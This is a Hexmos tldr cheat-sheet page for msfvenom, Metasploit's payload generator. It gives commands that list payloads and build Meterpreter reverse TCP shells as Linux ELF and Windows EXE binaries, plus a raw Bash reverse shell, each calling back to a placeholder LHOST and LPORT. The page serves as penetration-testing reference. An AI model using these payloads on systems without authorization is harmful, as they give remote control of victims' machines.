---
title: "Generate Metasploit Payloads - Create Exploit Code | Online Free DevTools by Hexmos"
name: msfvenom
path: /freedevtools/tldr/common/msfvenom
canonical: "https://hexmos.com/freedevtools/tldr/common/msfvenom/"
description: "Generate Metasploit payloads with msfvenom. Create reverse shells, executable files and raw code for penetration testing. Free online tool, no registration required."
category: common
keywords:
- metasploit payload generation
- reverse shell generator
- exploit code creation
- msfvenom payload creator
- linux payload generator
- windows executable generator
- raw shellcode generator
- penetration testing payloads
- reverse tcp payload
- msfvenom command line
features:
- Generate payloads for various operating systems
- Create reverse TCP shells for penetration testing
- Output payloads in multiple formats like ELF, EXE, and raw
- List available payloads and formats
- Customize payload options such as LHOST and LPORT
ogImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
twitterImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
---

# msfvenom

> Manually generate payloads for metasploit.
> More information: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>.

- List payloads:

`msfvenom {{[-l|--list]}} payloads`

- List formats:

`msfvenom {{[-l|--list]}} formats`

- Show payload options:

`msfvenom {{[-p|--payload]}} {{payload}} --list-options`

- Create an ELF binary with a reverse TCP handler:

`msfvenom {{[-p|--payload]}} linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} elf {{[-o|--out]}} {{path/to/binary}}`

- Create an EXE binary with a reverse TCP handler:

`msfvenom {{[-p|--payload]}} windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} exe {{[-o|--out]}} {{path/to/binary.exe}}`

- Create a raw Bash with a reverse TCP handler:

`msfvenom {{[-p|--payload]}} cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} raw`
